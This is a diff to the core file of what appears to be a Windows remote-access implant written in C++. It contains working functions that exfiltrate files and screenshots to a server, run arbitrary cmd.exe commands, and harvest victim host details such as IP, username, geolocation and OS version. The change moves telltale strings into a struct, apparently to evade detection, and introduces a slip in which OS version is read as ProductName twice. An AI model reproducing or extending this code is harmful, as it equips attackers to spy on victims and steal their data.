@@ -1,10 +1,11 @@
 #include "core.h"
 
+
 //Encodes and sends data in one easy function
 //Returns string output
-std::string sendEncodedString(std::string key, std::string data, std::string endpoint, HANDLE hConnect) {
+std::string sendEncodedString(struct Strings* strings, std::string key, std::string data, std::string endpoint, HANDLE hConnect) {
 	std::string result = encode(key, data);
-	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
+	HANDLE hRequest = HttpOpenRequestA(hConnect, strings->post.c_str(), endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
 	BOOL reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, (LPVOID)result.c_str(), result.length());
 	if (reqSuccess) {
 		DWORD receivedData = 0;
@@ -24,10 +25,7 @@ std::string sendEncodedString(std::string key, std::string data, std::string end
 
 //Uploads file to server via HTTP POST
 //Params: handle for internet, path of file to upload, key for XOR "encryption" 
-BOOL doFileUpload(HANDLE hConnect, char* filepath, int xorKey, std::string endpoint) {
-	char hdrs[] = "Content-Type: multipart/form-data; boundary=UPLOAD";
-	char head[] = "--UPLOAD\r\nContent-Disposition: form-data; name=\"file\"; filename=\"upload.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n";
-	char tail[] = "\r\n--UPLOAD--\r\n";
+BOOL doFileUpload(struct Strings* strings, HANDLE hConnect, char* filepath, int xorKey, std::string endpoint) {
 	char data[2048] = {};
 	DWORD bytesWritten = 0;
 	DWORD bytesRead = 0;
@@ -36,16 +34,17 @@ BOOL doFileUpload(HANDLE hConnect, char* filepath, int xorKey, std::string endpo
 		return FALSE;
 	DWORD dataSize = GetFileSize(hFile, NULL);
 
-	HANDLE hRequest = HttpOpenRequestA(hConnect,  "POST", endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
-	HttpAddRequestHeadersA(hRequest, hdrs, -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
+	HANDLE hRequest = HttpOpenRequestA(hConnect,  strings->post.c_str(), endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
+	HttpAddRequestHeadersA(hRequest, strings->uploadheaders.c_str(), -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
 
 	INTERNET_BUFFERSA bufferIn;
 	memset(&bufferIn, 0, sizeof(INTERNET_BUFFERSA));
 	bufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);
-	bufferIn.dwBufferTotal = strlen(head) + dataSize + strlen(tail);
+	
+	bufferIn.dwBufferTotal = strings->uploadheadfile.length() + dataSize + strings->uploadtail.length();
 
 	HttpSendRequestExA(hRequest, &bufferIn, NULL, HSR_INITIATE, 0);
-	InternetWriteFile(hRequest, (const void*)head, strlen(head), &bytesWritten);
+	InternetWriteFile(hRequest, (const void*)strings->uploadheadfile.c_str(), strings->uploadheadfile.length(), &bytesWritten);
 	do {
 		if (!ReadFile(hFile, &data, sizeof(data), &bytesRead, NULL)) {
 			HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
@@ -56,7 +55,7 @@ BOOL doFileUpload(HANDLE hConnect, char* filepath, int xorKey, std::string endpo
 		}
 		InternetWriteFile(hRequest, (const void*)data, bytesRead, &bytesWritten);
 	} while (bytesRead == sizeof(data));
-	InternetWriteFile(hRequest, (const void*)tail, strlen(tail), &bytesWritten);
+	InternetWriteFile(hRequest, (const void*)strings->uploadtail.c_str(), strings->uploadtail.length(), &bytesWritten);
 	HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
 	return TRUE;
 }
@@ -64,25 +63,22 @@ BOOL doFileUpload(HANDLE hConnect, char* filepath, int xorKey, std::string endpo
 
 //Uploads screenshot to server via HTTP POST
 //Params: handle for internet, path of file to upload, key for XOR "encryption" 
-BOOL doScreenshotUpload(HANDLE hConnect, std::vector<BYTE> bmp, int xorKey, std::string endpoint) {
-	char hdrs[] = "Content-Type: multipart/form-data; boundary=UPLOAD";
-	char head[] = "--UPLOAD\r\nContent-Disposition: form-data; name=\"file\"; filename=\"screenshot.bmp\"\r\nContent-Type: application/octet-stream\r\n\r\n";
-	char tail[] = "\r\n--UPLOAD--\r\n";
+BOOL doScreenshotUpload(struct Strings* strings, HANDLE hConnect, std::vector<BYTE> bmp, int xorKey, std::string endpoint) {
 	char data[2048] = {};
 	DWORD bytesWritten = 0;
 	DWORD bytesRead = 0;
 
 
-	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
-	HttpAddRequestHeadersA(hRequest, hdrs, -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
+	HANDLE hRequest = HttpOpenRequestA(hConnect, strings->post.c_str(), endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
+	HttpAddRequestHeadersA(hRequest, strings->uploadheaders.c_str(), -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
 
 	INTERNET_BUFFERSA bufferIn;
 	memset(&bufferIn, 0, sizeof(INTERNET_BUFFERSA));
 	bufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);
-	bufferIn.dwBufferTotal = strlen(head) + bmp.size() + strlen(tail);
+	bufferIn.dwBufferTotal = strings->uploadheadscreenshot.length() + bmp.size() + strings->uploadtail.length();
 
 	HttpSendRequestExA(hRequest, &bufferIn, NULL, HSR_INITIATE, 0);
-	InternetWriteFile(hRequest, (const void*)head, strlen(head), &bytesWritten);
+	InternetWriteFile(hRequest, (const void*)strings->uploadheadscreenshot.c_str(), strings->uploadheadscreenshot.length(), &bytesWritten);
 	UINT b = 0;
 	for (BYTE n : bmp) {
 		if (b >= sizeof(data)) {
@@ -95,7 +91,7 @@ BOOL doScreenshotUpload(HANDLE hConnect, std::vector<BYTE> bmp, int xorKey, std:
 	if (b > 0)
 		InternetWriteFile(hRequest, (const void*)data, b, &bytesWritten);
 
-	InternetWriteFile(hRequest, (const void*)tail, strlen(tail), &bytesWritten);
+	InternetWriteFile(hRequest, (const void*)strings->uploadtail.c_str(), strings->uploadtail.length(), &bytesWritten);
 	HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
 	return TRUE;
 }
@@ -111,9 +107,9 @@ BOOL doFileDownload(std::string url, std::string filepath) {
 
 //Executes commands and stores the output in string buffer. Timeout = MAX_TIMEOUT (prevents non-returning commands from breaking code)
 //Returns string buffer containing command output 
-std::string execCmd(std::string cmd, DWORD MAX_TIME) {
+std::string execCmd(struct Strings* strings, std::string cmd, DWORD MAX_TIME) {
 	std::string output;
-	cmd = "cmd.exe /C " + cmd;
+	cmd = strings->cmd + cmd;
 	HANDLE hPipeRead;
 	HANDLE hPipeWrite;
 
@@ -199,15 +195,15 @@ std::string sendRequestGetResponse(HANDLE hRequest) {
 
 
 //Gathers OS information via ProductName and DisplayVersion registry keys, returns string
-std::string getOSInfo() {
+std::string getOSInfo(struct Strings* strings) {
 	std::string str_data;
 	char value[256];
 	DWORD BufferSize = 255;
-	RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
+	RegGetValueA(HKEY_LOCAL_MACHINE, strings->regsubkey.c_str(), strings->productname.c_str(), RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
 	value[BufferSize] = 0;
 	str_data += value;
 	str_data += " ";
-	RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
+	RegGetValueA(HKEY_LOCAL_MACHINE, strings->regsubkey.c_str(), strings->productname.c_str(), RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
 	str_data += value;
 	return str_data;
 }
@@ -309,7 +305,7 @@ Gathers all info from device and converts to string. Basically just calls a bunc
 Currently includes: public IP, username, computer name, geolocation, memory amount, IP addresses, OS version info
 Output Format: publicIP&username&computername&iso2&memory&ip1,ip2,ip3...&osInfo
 */
-std::string gatherInfo(HANDLE hInternet) {
+std::string gatherInfo(struct Strings* strings, HANDLE hInternet) {
 	std::string allInfo;
 	allInfo += getPublicIP(hInternet);
 	allInfo += "&";
@@ -346,6 +342,6 @@ std::string gatherInfo(HANDLE hInternet) {
 	allInfo += "&";
 	allInfo += getNetworkInfo();
 	allInfo += "&";
-	allInfo += getOSInfo();
+	allInfo += getOSInfo(strings);
 	return allInfo;
 }
